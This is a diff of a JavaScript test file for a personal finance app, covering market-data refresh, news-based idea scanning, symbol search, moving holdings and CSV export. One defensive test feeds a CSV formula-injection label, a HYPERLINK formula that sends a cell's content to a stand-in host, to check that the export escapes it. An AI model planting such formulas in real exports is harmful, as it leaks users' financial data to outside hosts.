@@ -176,44 +176,55 @@ const T = '2026-11-03', CW8 = 'LU1681043599';
 const dateBack = n => new Date(Date.parse(T) - n * 864e5).toISOString().slice(0, 10);
 const closes = (end, slope) => Array.from({ length: 100 }, (_, k) => [dateBack(99 - k), Math.round((end - slope * (99 - k)) * 100) / 100]);
 
-test('P01: refresh is opt-in, stores 100 days of closes, logs hosts without the key, one call per day', async () => {
+const svcMarket = { enabled: true, proxyUrl: 'https://prix.example.workers.dev', proxyKey: 'SECRETKEY' };
+const yearOf = (end, currency = 'EUR') => ({ currency, closes: Array.from({ length: 120 }, (_, k) => [dateBack(119 - k), Math.round((end - 0.1 * (119 - k)) * 100) / 100]) });
+
+test('P01: refresh is opt-in, keeps the closes of the year, logs hosts without the key, every title every time', async () => {
   const { refreshMarket } = await import('./market.js');
   const s = withInstruments(), calls = [];
   await assert.rejects(refreshMarket(s, T, () => assert.fail()), /désactivées/);
-  Object.assign(s.settings.market, { enabled: true, avKey: 'SECRETKEY' });
-  const series = Object.fromEntries(Array.from({ length: 120 }, (_, k) => [dateBack(119 - k), { '4. close': String(104.5 - 0.1 * (119 - k)) }]));
+  Object.assign(s.settings.market, svcMarket);
   const fake = async url => {
     calls.push(url);
-    const body = url.includes('frankfurter') ? { date: T, rates: { USD: 1.12 } }
-      : url.includes('AAPL') ? { Information: 'rate limit' } : { 'Time Series (Daily)': series };
-    return { ok: true, json: async () => body };
+    const u = new URL(url), p = u.pathname;
+    if (url.includes('frankfurter')) return { ok: true, json: async () => ({ date: T, rates: { USD: 1.12 } }) };
+    if (p === '/search') return { ok: true, json: async () => [{ symbol: u.searchParams.get('q') === AAPL ? 'AAPL' : 'EUNL.DE' }] };
+    return u.searchParams.get('s') === 'AAPL' ? { ok: false, status: 502 } : { ok: true, json: async () => yearOf(104.5) };
   };
   const errors = await refreshMarket(s, T, fake);
   assert.equal(s.quotes[ETF].price, 104.5); assert.equal(s.quotes[ETF].asOf, T); assert.equal(s.history[ETF].length, 120); // up to a year is kept
   assert.equal(s.fx.USD.rate, 1.12);
-  assert.match(errors.join(), /rate limit/);
+  assert.match(errors.join(), /Apple/); // one title failing does not stop the others
   assert.ok(!JSON.stringify(s.requestLog).includes('SECRETKEY'));
-  const n = calls.length;
+  const charts = () => calls.filter(u => new URL(u).pathname === '/chart').length;
+  assert.equal(charts(), 2);
   await refreshMarket(s, T, fake);
-  assert.equal(calls.length, n + 1); // only the failed AAPL quote is retried
+  assert.equal(charts(), 4); // no quota with the own service: every title is asked again at each refresh
+  const off = withInstruments(); Object.assign(off.settings.market, { enabled: true });
+  assert.match((await refreshMarket(off, T, async () => ({ ok: true, json: async () => ({ rates: {} }) }))).join(), /Service de cours à configurer/);
 });
 
-test('Refresh spends the daily quota on the biggest positions first', async () => {
+test('Refresh goes through the biggest positions first', async () => {
   const { refreshMarket } = await import('./market.js');
-  const s = withInstruments(), calls = [];
+  const s = withInstruments(), asked = [];
   B.addHolding(s, 'b', ETF, '2025-01-01', 1, 10000);
   B.addHolding(s, 'b', AAPL, '2025-01-01', 1, 90000);
-  Object.assign(s.settings.market, { enabled: true, avKey: 'K' });
-  await refreshMarket(s, T, async url => { calls.push(url); return { ok: true, json: async () => (url.includes('frankfurter') ? { rates: {} } : { Information: 'quota' }) }; });
-  assert.match(calls.find(u => u.includes('alphavantage')), /symbol=AAPL/); // 900 € line before the 100 € one
+  Object.assign(s.settings.market, svcMarket);
+  await refreshMarket(s, T, async url => {
+    const u = new URL(url);
+    if (url.includes('frankfurter')) return { ok: true, json: async () => ({ rates: {} }) };
+    if (u.pathname === '/search') return { ok: true, json: async () => [{ symbol: u.searchParams.get('q') === AAPL ? 'AAPL' : 'EUNL.DE' }] };
+    asked.push(u.searchParams.get('s')); return { ok: true, json: async () => yearOf(100) };
+  });
+  assert.deepEqual(asked, ['AAPL', 'EUNL.DE']); // the 900 € line before the 100 € one
 });
 
-test('Market scan: the tool picks its own ideas from news trends and price history, within the daily quota', async () => {
+test('Market scan: the tool picks its own ideas from news trends and price history', async () => {
   const { discover, toAv, SCAN_CALLS } = await import('./market.js');
   const s = withInstruments(); // already follows EUNL.DEX and AAPL
   await assert.rejects(discover(s, T, () => assert.fail()), /Activez/);
-  Object.assign(s.settings.market, { enabled: true, avKey: 'K', newsKey: 'N' });
-  const rising = Object.fromEntries(Array.from({ length: 100 }, (_, k) => [dateBack(99 - k), { '4. close': String(50 + 0.2 * k) }]));
+  Object.assign(s.settings.market, svcMarket, { newsKey: 'N' });
+  const rising = sym => ({ currency: /\.PA$/.test(sym) ? 'EUR' : 'USD', closes: Array.from({ length: 100 }, (_, k) => [dateBack(99 - k), 50 + 0.2 * k]) });
   let trending = [
     { key: 'AAPL', total_documents: 90, sentiment_avg: 0.5 }, // already followed
     { key: 'NVDA', total_documents: 80, sentiment_avg: 0.4 },
@@ -224,14 +235,15 @@ test('Market scan: the tool picks its own ideas from news trends and price histo
   const calls = [];
   const fake = async url => {
     calls.push(url);
+    const u = new URL(url);
     const body = url.includes('trending') ? { data: trending }
       : url.includes('entity/search') ? { data: [{ symbol: 'NVDA', name: 'NVIDIA Corporation' }, { symbol: 'MC.PA', name: 'LVMH' }] }
-        : { 'Time Series (Daily)': rising };
+        : u.pathname === '/chart' ? rising(u.searchParams.get('s')) : { date: T, rates: { USD: 1.12 } };
     return { ok: true, json: async () => body };
   };
   assert.deepEqual(await discover(s, T, fake), []);
   const ideas = s.instruments.filter(i => i.auto);
-  assert.equal(ideas.length, SCAN_CALLS); assert.equal(s.avCalls.n, SCAN_CALLS);
+  assert.equal(ideas.length, SCAN_CALLS); assert.equal(calls.filter(u => new URL(u).pathname === '/chart').length, SCAN_CALLS);
   assert.deepEqual(ideas.slice(0, 2).map(i => [i.isin, i.name, i.currency]), [['NVDA', 'NVIDIA Corporation', 'USD'], ['MC.PAR', 'LVMH', 'EUR']]);
   const v = verdict(s, 'MC.PAR'); // rising price + positive coverage
   assert.equal(v.action, 'Acheter'); assert.ok(v.reasons.some(r => /Repéré par l’outil : 30 articles/.test(r.text) && r.source === 'Marketaux'));
@@ -247,12 +259,11 @@ test('Market scan: the tool picks its own ideas from news trends and price histo
 test('Market scan falls back to recent market articles when the trending endpoint is not in the plan', async () => {
   const { discover } = await import('./market.js');
   const s = withInstruments();
-  Object.assign(s.settings.market, { enabled: true, avKey: 'K', newsKey: 'N' });
-  const rising = Object.fromEntries(Array.from({ length: 100 }, (_, k) => [dateBack(99 - k), { '4. close': String(50 + 0.2 * k) }]));
+  Object.assign(s.settings.market, svcMarket, { newsKey: 'N' });
   const fake = async url => {
     if (url.includes('trending')) return { ok: false, status: 402 };
     const body = url.includes('news/all') ? { data: [{ entities: [{ type: 'equity', symbol: 'SAP.DE', sentiment_score: 0.6 }, { type: 'index', symbol: 'DAX' }] }] }
-      : url.includes('frankfurter') ? { date: T, rates: {} } : { 'Time Series (Daily)': rising };
+      : url.includes('frankfurter') ? { date: T, rates: {} } : { currency: 'EUR', closes: Array.from({ length: 100 }, (_, k) => [dateBack(99 - k), 50 + 0.2 * k]) };
     return { ok: true, json: async () => body };
   };
   await discover(s, T, fake);
@@ -288,15 +299,14 @@ test('Own price service: listing found from the ISIN (OpenFIGI for US ISINs), cu
 });
 const withInstrumentsOn = market => { const s = withInstruments(); Object.assign(s.settings.market, market); return s; };
 
-test('Adding a title: name search gives symbol, type and currency; no ISIN needed; news searched by name or index', async () => {
+test('Adding a title: name search gives symbol, type and exchange; no ISIN needed; news searched by name or index', async () => {
   const { searchSymbols } = await import('./market.js');
   const s = base();
   await assert.rejects(searchSymbols(s, 'total', () => assert.fail()), /Activez/);
-  Object.assign(s.settings.market, { enabled: true, avKey: 'K' });
-  const [r] = await searchSymbols(s, 'total', async () => ({ ok: true, json: async () => ({ bestMatches: [
-    { '1. symbol': 'TTE.PAR', '2. name': 'TotalEnergies SE', '3. type': 'Equity', '4. region': 'Paris', '8. currency': 'EUR' }] }) }));
-  assert.deepEqual(r, { symbol: 'TTE.PAR', name: 'TotalEnergies SE', type: 'Equity', region: 'Paris', currency: 'EUR' });
-  assert.equal(B.saveInstrument(s, { symbol: r.symbol, name: r.name, currency: r.currency, type: r.type }), 'TTE.PAR');
+  Object.assign(s.settings.market, svcMarket);
+  const [r] = await searchSymbols(s, 'total', async () => ({ ok: true, json: async () => [{ symbol: 'TTE.PA', name: 'TotalEnergies SE', exchange: 'Paris', type: 'EQUITY' }] }));
+  assert.deepEqual(r, { symbol: 'TTE.PA', name: 'TotalEnergies SE', type: 'EQUITY', region: 'Paris', currency: '' });
+  assert.equal(B.saveInstrument(s, { symbol: r.symbol, name: r.name, currency: 'EUR', type: r.type }), 'TTE.PA');
   assert.equal(B.newsQuery(s.instruments[0]), 'TotalEnergies');
   assert.equal(B.newsQuery({ name: 'iShares Core MSCI World UCITS ETF USD (Acc)' }), 'MSCI World');
 });
@@ -1231,4 +1241,25 @@ test('Audit 3: only real data are kept aside before a replacement, the demo neve
   assert.equal(B.worthKeeping(B.demoState(T)), false);
   assert.equal(B.worthKeeping(base()), true);
   assert.equal(B.validateState(JSON.parse(JSON.stringify(B.demoState(T)))).isDemo, true); // the flag survives a save
+});
+
+test('Audit 4: moving a title says how much cash moved with it', () => {
+  const s = B.emptyState(); s.accounts.push({ id: 'c', name: 'CTO', opening: 0, type: 'CTO' }, { id: 'p', name: 'PEA', opening: 0, type: 'PEA' });
+  B.saveInstrument(s, { isin: 'FR0000120271', name: 'Total', currency: 'EUR' });
+  B.addPurchase(s, { accountId: 'c', isin: 'FR0000120271', date: '2026-11-01', qty: 1, cents: 10000 });
+  B.setCash(s, 'c', '2026-11-02', 50000); B.setCash(s, 'p', '2026-11-02', 20000);
+  assert.equal(B.moveHolding(s, 'FR0000120271', 'c', 'p'), -10000); // the purchase and its 100 € followed the title
+  assert.deepEqual([B.balance(s, s.accounts[0]), B.balance(s, s.accounts[1])], [60000, 10000]);
+  const h = B.emptyState(); h.accounts.push({ id: 'c', name: 'CTO', opening: 0 }, { id: 'p', name: 'PEA', opening: 0 });
+  B.saveInstrument(h, { isin: 'FR0000120271', name: 'Total', currency: 'EUR' }); B.addHolding(h, 'c', 'FR0000120271', '2025-01-01', 2, 20000);
+  assert.equal(B.moveHolding(h, 'FR0000120271', 'c', 'p'), 0); // a declared holding moves no cash
+});
+
+test('Audit 9: a label starting with = + - @ is exported as text, not as a formula', () => {
+  const s = B.emptyState(); s.accounts.push({ id: 'a', name: 'BCP', opening: 0 });
+  for (const [id, label] of [['1', '=HYPERLINK("http://exemple.invalid/?"&A2,"x")'], ['2', '+33 1 23'], ['3', '@SUM(A1)'], ['4', '-cmd'], ['5', 'Courses 5 € - Carrefour']])
+    s.ops.push({ id, accountId: 'a', date: '2026-11-03', amount: -100, kind: 'expense', categoryId: null, label });
+  const rows = B.opsCsv(s).split('\n').slice(1);
+  for (const r of rows.slice(0, 4)) assert.match(r, /;"'[=+@-]/);
+  assert.match(rows[4], /;"Courses 5 € - Carrefour";/); // a normal label is untouched
 });
